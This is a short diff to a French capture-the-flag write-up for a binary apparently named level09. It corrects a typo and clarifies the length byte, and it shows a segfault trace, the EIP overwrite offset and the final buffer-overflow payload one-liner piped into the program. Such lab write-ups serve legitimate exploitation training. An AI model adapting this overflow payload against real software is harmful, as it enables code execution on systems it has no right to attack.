@@ -38,9 +38,9 @@ Puis trouver l'offset necessaire a l'overwrite de EIP pour y ecrire l'adresse de
     Program received signal SIGSEGV, Segmentation fault.
     0x424242424242 in ?? ()
     
-L'offset est de 268 si on utilise la valeur \xce dans length.
+L'offset est de 268 si on utilise la valeur `\xce` (206) dans length.
 
-Voici notre paylaod final :
+Voici notre payload final :
 
     python -c "print('A'*40 + '\xce' + 'A'*286 + '\x8c\x48\x55\x55\x55\x55')" > /tmp/x
     cat /tmp/x - | ./level09
